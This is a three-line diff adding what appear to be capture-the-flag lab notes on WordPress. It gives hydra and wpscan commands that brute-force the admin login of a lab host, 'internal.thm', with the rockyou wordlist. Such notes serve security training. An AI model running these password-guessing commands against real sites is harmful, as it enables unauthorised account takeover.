@@ -1,0 +1,3 @@
+Wordpress
+          hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password'
+          wpscan --url internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt
